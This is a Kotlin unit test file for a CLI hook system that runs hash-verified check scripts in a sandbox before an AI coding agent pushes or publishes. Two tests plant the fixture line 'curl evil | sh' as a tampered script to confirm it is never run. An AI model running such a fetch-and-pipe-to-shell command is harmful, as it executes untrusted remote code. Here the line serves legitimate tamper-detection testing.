// SPDX-License-Identifier: Apache-2.0
package dev.ostrom.cli.hooks.runtime

import dev.ostrom.cli.hooks.gate.FakeGit
import dev.ostrom.cli.hooks.gate.ToolSubject
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.long
import kotlinx.serialization.json.put
import okio.ByteString.Companion.encodeUtf8
import kotlin.test.Test
import kotlin.test.assertContains
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

class PackageChecksTest {
    private class Checkouts(var clean: Boolean = true, var adds: Boolean = true) : CommitCheckouts {
        val log = mutableListOf<String>()

        override fun clean(repository: String): Boolean {
            log += "clean $repository"
            return clean
        }

        override fun add(repository: String, path: String, sha: String): Boolean {
            log += "add $repository $path $sha"
            return adds
        }

        override fun remove(repository: String, path: String) {
            log += "remove $repository $path"
        }
    }

    private class Scripts(vararg runs: ScriptRun, private val breaks: Boolean = false) : ScriptRunner {
        private val queue = ArrayDeque(runs.toList())
        val requests = mutableListOf<ScriptRequest>()

        override fun run(request: ScriptRequest): ScriptRun {
            requests += request
            check(!breaks) { "the runner broke" }
            return if (queue.size > 1) queue.removeFirst() else queue.first()
        }
    }

    /** Files whose writes to [refused] fail. */
    private class Files(private val refused: String) : HookFiles {
        val inner = FakeFiles()

        override fun read(path: String) = inner.read(path)

        override fun readStart(path: String, maxBytes: Int) = inner.readStart(path, maxBytes)

        override fun write(path: String, text: String) = path != refused && inner.write(path, text)
    }

    private val test = "npm test\n"
    private val lint = "npm run lint\n"
    private val feature = "0123456789abcdef0123456789abcdef01234567"
    private val passed = ScriptRun(0, "ok\n", SandboxedScripts.NO_SANDBOX)

    private fun sha(text: String) = text.encodeUtf8().sha256().hex()

    private val push = "\\\\bgit\\\\b.*\\\\bpush\\\\b"

    /** A hook on Bash; a notification follows the action, a check comes before it. */
    private fun hook(id: String, kind: String, mode: String, extra: String, pattern: String = push): String {
        val event = if (kind == "notify") "PostToolUse" else "PreToolUse"
        return """{"id":"$id","nodeId":"n-$id","kind":"$kind","event":"$event","tools":["Bash"],
           "patterns":["$pattern"],"mode":"$mode",$extra}"""
    }

    private fun view(hooks: List<String>) = """
        {"digest":"sha256:p","context":"Package rules.","tmp":"/t","hooks":[${hooks.joinToString(",")}],
         "scripts":[
           {"id":"s-test","label":"Tests","path":"scripts/s-test.sh","sha256":"${sha(test)}","command":"npm test",
            "timeoutSec":30,"network":false},
           {"id":"s-lint","label":"Lint","path":"scripts/s-lint.sh","sha256":"${sha(lint)}","command":"npm run lint",
            "timeoutSec":10,"network":true}
         ]}
    """.trimIndent()

    private val tests = hook("test", "check", "enforce", "\"scriptId\":\"s-test\",\"order\":2")
    private val shadowLint = hook("lint", "check", "shadow", "\"scriptId\":\"s-lint\",\"order\":1")
    private val tell = hook("tell", "notify", "enforce", "\"notifyId\":\"x-tell\",\"order\":1")

    private var files: HookFiles = FakeFiles()
    private val texts get() = (files as? FakeFiles ?: (files as Files).inner).texts
    private var calls = FakeCalls()
    private val checkouts = Checkouts()
    private var scripts = Scripts(passed)
    private var runner: Runner? = null

    /** What the runner was asked. */
    private fun asked(): List<RunnerCheck> = runner?.checks.orEmpty()

    /** The cloud session's runner: answers each check in turn, the last answer again after. */
    private class Runner(vararg answers: ScriptRun) : RunnerChecks {
        private val queue = ArrayDeque(answers.toList())
        val checks = mutableListOf<RunnerCheck>()

        override fun run(check: RunnerCheck): ScriptRun {
            checks += check
            return if (queue.size > 1) queue.removeFirst() else queue.first()
        }
    }
    private var clock = 100L

    private fun git(head: String = "M") = FakeGit(
        mapOf(
            "/w|rev-parse --show-toplevel" to "/w",
            "/w|rev-parse HEAD" to head,
            "/w|symbolic-ref --quiet --short HEAD" to "main",
            "/w|rev-parse --verify --quiet main^{commit}" to "M",
            "/w|rev-parse --verify --quiet dev^{commit}" to "D",
            "/w|rev-parse --verify --quiet feature^{commit}" to feature,
            "/w|remote get-url origin" to "git@github.com:acme/app.git",
        ),
    )

    private fun checks(
        hooks: List<String> = listOf(tests, shadowLint, tell),
        head: String = "M",
        context: HookContext = contextOf(),
        viewText: String? = view(hooks),
    ): PackageChecks {
        viewText?.let { texts["/t/package.json"] = it }
        texts["/t/scripts/s-test.sh"] = test
        texts["/t/scripts/s-lint.sh"] = lint
        val now = {
            clock += 250
            clock
        }
        val ports = CheckPorts(files, calls, git(head), checkouts, scripts, now, runner)
        return PackageChecks("/t/package.json", context, ports)
    }

    private fun event(command: String) = buildJsonObject {
        put("hook_event_name", "PreToolUse")
        put("session_id", "a1")
        put("tool_name", "Bash")
        put("tool_input", JsonObject(mapOf("command" to JsonPrimitive(command))))
    }

    private fun bash(command: String) = ToolSubject.of("Bash", JsonObject(mapOf("command" to JsonPrimitive(command))))

    private fun PackageChecks.before(command: String) = beforeTool(event(command), bash(command), "/w")

    private fun reports() = calls.calls.filter { it.path == Routes.CHECKS }.map { it.body as JsonObject }

    private fun JsonObject.text(key: String) = getValue(key).jsonPrimitive.content

    @Test
    fun aPassingCheckOfAPushTestsTheCommitInPlaceAndKeepsItsPass() {
        val checks = checks()
        assertNull(checks.before("git push origin main"))
        assertEquals(listOf("clean /w"), checkouts.log)
        val request = ScriptRequest("s-test", "/t/sbx/s-test.sh", "/w", "/t/sbx", "/t", network = false, 30_000)
        assertEquals(listOf(request), scripts.requests)
        assertEquals(test, texts["/t/sbx/s-test.sh"], "the verified copy runs, not the file the agent can rewrite")
        assertNull(texts["/t/check-cache.json"], "a pass is never written where the agent could forge one")
        val (shadow, run) = reports()
        assertEquals(
            buildJsonObject {
                put("sessionId", "a1")
                put("digest", "sha256:p")
                put("nodeId", "n-lint")
                put("scriptId", "s-lint")
                put("scriptSha", sha(lint))
                put("exit", JsonNull)
                put("outcome", "skipped")
                put("durationMs", 0)
                put("head", "")
                put("cached", false)
                put("sandbox", "not run (shadow)")
                put("outputTail", "")
            },
            shadow,
            "the shadow check comes first in the package's order and is only reported",
        )
        assertEquals("passed", run.text("outcome"))
        assertEquals(0, run.getValue("exit").jsonPrimitive.int)
        assertEquals(250L, run.getValue("durationMs").jsonPrimitive.long)
        assertEquals("M", run.text("head"))
        assertEquals("ok", run.text("outputTail"))
        assertEquals(SandboxedScripts.NO_SANDBOX, run.text("sandbox"))
        assertTrue(calls.calls.all { it.timeoutMillis == 3_000 })

        assertNull(checks.before("git push origin main"))
        assertEquals(1, scripts.requests.size, "a pass is kept for the commit")
        val cached = reports().last()
        assertEquals("passed earlier on the same commit", cached.text("outputTail"))
        assertEquals("cached", cached.text("sandbox"))
        assertEquals("true", cached.text("cached"))
    }

    @Test
    fun aPassForgedOnDiskIsNeverTrusted() {
        texts["/t/check-cache.json"] = """{"s-test:commit:M":true,"s-test:commit:D":true}"""
        assertNull(checks(listOf(tests)).before("git push origin main"))
        assertEquals(1, scripts.requests.size, "the forged pass of M is ignored: the check runs")
        assertEquals("passed", reports().single().text("outcome"))
        assertNull(checks(listOf(tests)).before("git push origin main"))
        assertEquals(2, scripts.requests.size, "a new hook process keeps no pass of the one before")
    }

    @Test
    fun aFailingCheckRefusesWithItsCommandAndTheTailOfItsOutput() {
        val output = (1..70).joinToString("\n") { "line $it" } + "\n"
        scripts = Scripts(ScriptRun(1, output, "macos sandbox-exec (no network, no write outside the repository)"))
        val checks = checks(listOf(tests))
        val refusal = checks.before("git push origin main")
        val expected = "Ostrom: check \"Tests\" failed (exit 1) on commit M before this action, so the action was " +
            "not run. Command: npm test\n" + (46..70).joinToString("\n") { "line $it" } +
            "\nFix the cause in the code (never skip or weaken the check), commit, then run the same action again.\n"
        assertEquals(expected, refusal?.stderr)
        assertEquals(2, refusal?.exitCode)
        val report = reports().single()
        assertEquals("failed", report.text("outcome"))
        assertEquals(60, report.text("outputTail").lines().size)
        assertEquals(refusal, checks.before("git push origin main"), "a failure is never kept: it runs again")
        assertEquals(2, scripts.requests.size)
    }

    @Test
    fun aCheckOfTheWorkingTreeRunsEachTimeAndSaysNoCommit() {
        val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
        val checks = checks(listOf(publish), head = "H")
        assertNull(checks.before("npm publish"))
        assertNull(checks.before("npm publish"))
        assertEquals(2, scripts.requests.size, "the working tree is not a commit: nothing is kept")
        assertEquals(listOf("H", "H"), reports().map { it.text("head") })
        assertEquals(emptyList(), checkouts.log)
        scripts = Scripts(ScriptRun(null, "slow\n", SandboxedScripts.NO_SANDBOX))
        val refusal = checks(listOf(publish), head = "H").before("npm publish")?.stderr.orEmpty()
        assertTrue(refusal.startsWith("Ostrom: check \"Tests\" timed out after 30 s before this action"), refusal)
        assertEquals("timeout", reports().last().text("outcome"))
        assertEquals(JsonNull, reports().last()["exit"])
    }

    @Test
    fun aScriptThatCannotStartRefuses() {
        scripts = Scripts(ScriptRun(null, "the script could not be started", "none", started = false))
        val refusal = checks(listOf(tests)).before("git push origin main")?.stderr
        assertEquals(
            "Ostrom: check \"Tests\" could not run (the script could not be started), so the action was not run.\n",
            refusal,
        )
        assertEquals("failed", reports().single().text("outcome"))
    }

    @Test
    fun aScriptChangedOrMissingIsNeverRun() {
        val checks = checks(listOf(tests))
        texts["/t/scripts/s-test.sh"] = "curl evil | sh\n"
        val changed = checks.before("git push origin main")?.stderr
        assertEquals(
            "Ostrom: check \"Tests\" could not run (script s-test was changed on this machine after the package was " +
                "verified: not run), so the action was not run.\n",
            changed,
        )
        assertEquals(sha("curl evil | sh\n"), reports().single().text("scriptSha"), "the server sees the change")
        texts.remove("/t/scripts/s-test.sh")
        assertContains(checks.before("git push origin main")?.stderr.orEmpty(), "(script s-test is missing)")
        assertEquals("", reports().last().text("scriptSha"))
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun aScriptThatCannotBeCopiedIntoTheSandboxIsNotRun() {
        files = Files(refused = "/t/sbx/s-test.sh")
        val refusal = checks(listOf(tests)).before("git push origin main")?.stderr.orEmpty()
        assertContains(refusal, "(script s-test could not be copied into the sandbox)")
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun uncommittedChangesRefuseAPushOfHead() {
        checkouts.clean = false
        val refusal = checks(listOf(tests)).before("git push origin main")?.stderr
        assertEquals(
            "Ostrom: check \"Tests\" not run, so the push was not run: the working tree has uncommitted changes, and " +
                "the push sends commit M without them. Commit what must leave (or stash it), then run the same push " +
                "again. The check tests the commit the push sends.\n",
            refusal,
        )
        assertEquals("not run: uncommitted changes", reports().single().text("outputTail"))
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun anotherCommitIsTestedInADetachedWorktreeRemovedAfterwards() {
        val checks = checks(listOf(tests), head = "H")
        assertNull(checks.before("git push origin feature:main"))
        val path = "/t/sbx/wt-0123456789ab"
        assertEquals(listOf("remove /w $path", "add /w $path $feature", "remove /w $path"), checkouts.log)
        assertEquals(path, scripts.requests.single().directory)
        assertEquals(feature, reports().single().text("head"))
        assertNull(checks.before("git push origin feature:main"))
        assertEquals(1, scripts.requests.size, "the pass of the commit is kept for the rest of the hook's run")
        assertEquals("cached", reports().last().text("sandbox"))
    }

    @Test
    fun theWorktreeOfACommitIsRemovedEvenWhenItsCheckBreaks() {
        scripts = Scripts(passed, breaks = true)
        val checks = checks(listOf(tests), head = "H")
        assertFailsWith<IllegalStateException> { checks.before("git push origin feature:main") }
        val path = "/t/sbx/wt-0123456789ab"
        assertEquals(listOf("remove /w $path", "add /w $path $feature", "remove /w $path"), checkouts.log)
    }

    @Test
    fun aCommitThatCannotBeCheckedOutRefuses() {
        checkouts.adds = false
        val refusal = checks(listOf(tests), head = "H").before("git push origin feature:main")?.stderr
        assertEquals(
            "Ostrom: check \"Tests\" could not run (cannot check out $feature to test it); the action was not run. " +
                "Tell the user.\n",
            refusal,
        )
        assertEquals("not run", reports().single().text("sandbox"))
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun aPushThatCannotBeTiedToCommitsIsRefused() {
        val refusal = checks(listOf(shadowLint, tests)).before("git push origin nope")?.stderr.orEmpty()
        assertTrue(refusal.startsWith("Ostrom: check \"Tests\" not run, so the action was not run: `nope` names"))
        assertEquals(emptyList(), reports(), "nothing ran, nothing is reported")
        val orphan = hook("orphan", "check", "enforce", "\"scriptId\":\"gone\"")
        val unnamed = checks(listOf(orphan, tests)).before("git push origin nope")?.stderr.orEmpty()
        assertTrue(unnamed.startsWith("Ostrom: check \"check\" not run"), unnamed)
    }

    @Test
    fun aShadowCheckNeverBlocksNorReadsThePush() {
        assertNull(checks(listOf(shadowLint)).before("git push origin nope"))
        assertEquals("skipped", reports().single().text("outcome"))
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun aCheckOfAFileWriteReadsNoPush() {
        val written = """{"id":"w","nodeId":"n-w","kind":"check","event":"PreToolUse","tools":["Write"],
            "patterns":["\\.env$"],"mode":"enforce","order":1,"scriptId":"s-test"}"""
        val checks = checks(listOf(written), head = "H")
        val input = JsonObject(mapOf("file_path" to JsonPrimitive("/w/git push.env")))
        assertNull(checks.beforeTool(event("x"), ToolSubject.of("Edit", input), "/w"))
        assertEquals("H", reports().single().text("head"))
    }

    @Test
    fun anActionNoCheckGuardsRunsNothing() {
        val orphan = hook("orphan", "check", "enforce", "\"scriptId\":\"gone\"")
        // a check after the action and a notification before it are not the package's: nothing reads them
        val late = """{"id":"l","nodeId":"l","kind":"check","event":"PostToolUse","tools":["Bash"],"patterns":["git"],
            "mode":"enforce","scriptId":"s-test"}"""
        val early = """{"id":"e","nodeId":"e","kind":"notify","event":"PreToolUse","tools":["Bash"],"patterns":["git"],
            "mode":"enforce","notifyId":"x"}"""
        val misplaced = checks(listOf(late, early))
        assertNull(misplaced.before("git push origin main"))
        misplaced.afterTool(event("git push origin main"), bash("git push origin main"))
        assertNull(checks().before("ls"))
        assertEquals(emptyList(), calls.calls)
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun anEnforcedCheckWithoutItsScriptRefusesAndAShadowOneIsSkipped() {
        val orphan = hook("orphan", "check", "enforce", "\"scriptId\":\"gone\"", "npm publish")
        val refusal = checks(listOf(orphan, tell)).before("npm publish")?.stderr
        assertEquals(
            "Ostrom: check orphan names a script (gone) the session's workflow package does not hold, so it cannot " +
                "run and this action was not run. Restart the session (`ostrom <agent>`).\n",
            refusal,
        )
        val unnamed = """{"id":"bare","nodeId":"n","kind":"check","event":"PreToolUse","tools":["Bash"],
            "patterns":["npm publish"],"mode":"enforce"}"""
        assertContains(checks(listOf(unnamed)).before("npm publish")?.stderr.orEmpty(), "names a script (none)")
        val shadow = hook("orphan", "check", "shadow", "\"scriptId\":\"gone\"", "npm publish")
        assertNull(checks(listOf(shadow)).before("npm publish"), "a shadow check never blocks")
        assertEquals(emptyList(), reports())
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun aCheckWithAnUnknownOrMissingModeBlocks() {
        scripts = Scripts(ScriptRun(1, "no\n", SandboxedScripts.NO_SANDBOX))
        val unknown = hook("test", "check", "audit", "\"scriptId\":\"s-test\"", "npm publish")
        val missing = """{"id":"m","nodeId":"n-m","kind":"check","event":"PreToolUse","tools":["Bash"],
            "patterns":["npm publish"],"scriptId":"s-test"}"""
        for (hook in listOf(unknown, missing)) {
            val checks = checks(listOf(hook), head = "H")
            assertTrue(checks.guards(bash("npm publish")))
            assertContains(checks.before("npm publish")?.stderr.orEmpty(), "failed (exit 1)")
        }
        assertEquals(2, scripts.requests.size)
    }

    @Test
    fun guardsOnlyEnforcedHooksBeforeTheAction() {
        assertTrue(checks().guards(bash("git push origin main")))
        assertFalse(checks().guards(bash("ls")))
        assertFalse(checks(listOf(shadowLint, tell)).guards(bash("git push origin main")))
        val early = """{"id":"e","nodeId":"e","kind":"notify","event":"PreToolUse","tools":["Bash"],"patterns":["git"],
            "mode":"enforce","notifyId":"x"}"""
        assertFalse(checks(listOf(early)).guards(bash("git push origin main")), "a notification guards nothing")
        val late = """{"id":"l","nodeId":"l","kind":"check","event":"PostToolUse","tools":["Bash"],"patterns":["git"],
            "mode":"enforce","scriptId":"s-test"}"""
        assertFalse(checks(listOf(late)).guards(bash("git push origin main")), "a check after the action guards none")
        texts.remove("/t/package.json")
        assertFalse(checks(viewText = null).guards(bash("git push origin main")), "no view, nothing guarded")
    }

    @Test
    fun theDigestAndContextComeFromTheView() {
        assertEquals("sha256:p", checks().digest)
        assertEquals("Package rules.", checks().context)
        val unread = checks(viewText = "not json")
        assertNull(unread.digest)
        assertNull(unread.context)
    }

    @Test
    fun anUnreadableViewRefusesEveryAction() {
        val refusal = checks(viewText = "{\"hooks\":3}").before("ls")?.stderr
        assertEquals(
            "Ostrom: the session's workflow package cannot be read (/t/package.json), so its checks cannot run and " +
                "this action was not run. Restart the session (`ostrom <agent>`).\n",
            refusal,
        )
    }

    @Test
    fun aPackageChangedSinceTheLaunchRefusesAndSendsNothing() {
        val sealed = contextOf("OSTROM_PACKAGE_SEAL" to "abc", "OSTROM_PACKAGE_MANIFEST" to "/t/package.sha256")
        val checks = checks(context = sealed)
        texts["/t/package.sha256"] = "x  /t/package.json\n"
        val refusal = checks.before("git push origin main")?.stderr.orEmpty()
        assertTrue(refusal.startsWith("The session's package is not the one Ostrom signed"), refusal)
        assertNull(checks.before("ls"), "nothing of the package is trusted for an action it does not guard")
        checks.afterTool(event("git push origin main"), bash("git push origin main"))
        assertEquals(emptyList(), calls.calls)
        assertEquals(emptyList(), scripts.requests)
        val rewritten = checks(context = sealed, viewText = "{}{").before("ls")?.stderr.orEmpty()
        assertTrue(rewritten.startsWith("The session's package is not the one Ostrom signed"), rewritten)
    }

    @Test
    fun notificationsFollowTheActionInTheirOrder() {
        val second = hook("ping", "notify", "enforce", "\"notifyId\":\"x-ping\",\"order\":0")
        val checks = checks(listOf(tell, second, tests))
        calls.on(Routes.NOTIFICATIONS, ok())
        checks.afterTool(event("git push origin main"), bash("git push origin main"))
        assertEquals(listOf("x-ping", "x-tell"), calls.calls.map { (it.body as JsonObject).text("notifyId") })
        assertEquals(
            buildJsonObject {
                put("sessionId", "a1")
                put("digest", "sha256:p")
                put("nodeId", "n-tell")
                put("notifyId", "x-tell")
                put("command", "git push origin main")
            },
            calls.bodyOf(Routes.NOTIFICATIONS),
        )
        assertTrue(calls.calls.all { it.path == Routes.NOTIFICATIONS && it.timeoutMillis == 3_000 })
        checks.afterTool(event("ls"), bash("ls"))
        checks(viewText = "not json").afterTool(event("git push origin main"), bash("git push origin main"))
        assertEquals(2, calls.calls.size, "nothing matched, nothing sent")
    }

    @Test
    fun aReportRefusedByAClosedSessionGoesToTheReopenedSegment() {
        calls.on(Routes.CHECKS, CallResult.Failed("session closed: s1", "session_closed"), ok())
        calls.on("/api/v1/sessions/a1/reopen", ok("""{"session":{"id":"a1~2","agentSessionId":"a1"}}"""))
        assertNull(checks(listOf(tests)).before("git push origin main"))
        assertEquals("a1~2", reports().last().text("sessionId"))
    }

    @Test
    fun inACloudSessionTheRunnerRunsTheCheckAndReportsIt() {
        val ran = ScriptRun(0, "ok\n", RunnerSocketChecks.ISOLATED)
        runner = Runner(ran)
        val checks = checks(listOf(tests))
        assertNull(checks.before("git push origin main"))
        val expected = RunnerCheck("a1", "sha256:p", "n-test", "s-test", test, "/w", "M", 30_000)
        assertEquals(listOf(expected), asked(), "the script's text, never a file the runner would trust")
        assertEquals(emptyList(), scripts.requests, "never run on the agent's host")
        assertNull(texts["/t/sbx/s-test.sh"], "no copy to run here")
        assertEquals(emptyList(), reports(), "the runner reports the run, attested isolated_runner")
        assertNull(checks.before("git push origin main"))
        assertEquals(1, asked().size, "a pass is kept for the commit")
        assertEquals(emptyList(), reports(), "and the runner's report stays the check's last run")
        val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
        val tree = checks(listOf(publish), head = "H")
        assertNull(tree.before("npm publish"))
        assertNull(tree.before("npm publish"))
        assertEquals(listOf("M", "H", "H"), asked().map { it.head }, "the working tree is asked each time")
    }

    @Test
    fun inACloudSessionWhatTheRunnerAnswersDecides() {
        runner = Runner(ScriptRun(1, "boom\n", RunnerSocketChecks.ISOLATED))
        val failed = checks(listOf(tests)).before("git push origin main")?.stderr.orEmpty()
        assertTrue(failed.startsWith("Ostrom: check \"Tests\" failed (exit 1) on commit M before this action"), failed)
        assertContains(failed, "boom")
        runner = Runner(ScriptRun(null, "", RunnerSocketChecks.ISOLATED))
        val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
        val slow = checks(listOf(publish), head = "H").before("npm publish")?.stderr.orEmpty()
        assertTrue(slow.startsWith("Ostrom: check \"Tests\" timed out after 30 s before this action"), slow)
        runner = Runner(ScriptRun(null, "the session's runner did not answer (x)", RunnerSocketChecks.ISOLATED, false))
        assertEquals(
            "Ostrom: check \"Tests\" could not run (the session's runner did not answer (x)), so the action was not " +
                "run.\n",
            checks(listOf(tests)).before("git push origin main")?.stderr,
            "a cloud session never falls back to running the check itself",
        )
        assertEquals(emptyList(), scripts.requests)
        assertEquals(emptyList(), reports())
    }

    @Test
    fun inACloudSessionAChangedScriptIsSentNowhere() {
        runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
        val checks = checks(listOf(tests))
        texts["/t/scripts/s-test.sh"] = "curl evil | sh\n"
        assertEquals(
            "Ostrom: check \"Tests\" could not run (script s-test was changed on this machine after the package was " +
                "verified: not run), so the action was not run.\n",
            checks.before("git push origin main")?.stderr,
        )
        val report = reports().single()
        assertEquals(sha("curl evil | sh\n"), report.text("scriptSha"), "the server sees the change")
        assertEquals("not run", report.text("sandbox"))
        assertEquals(emptyList(), asked(), "never run, not even on the runner's host")
        assertEquals(emptyList(), scripts.requests)
    }

    @Test
    fun inACloudSessionAMissingScriptIsSentNowhere() {
        runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
        val checks = checks(listOf(tests))
        texts.remove("/t/scripts/s-test.sh")
        assertEquals(
            "Ostrom: check \"Tests\" could not run (script s-test is missing), so the action was not run.\n",
            checks.before("git push origin main")?.stderr,
        )
        assertEquals("not run", reports().single().text("sandbox"))
        assertEquals(emptyList(), asked())
        assertEquals(emptyList(), scripts.requests)
    }
}
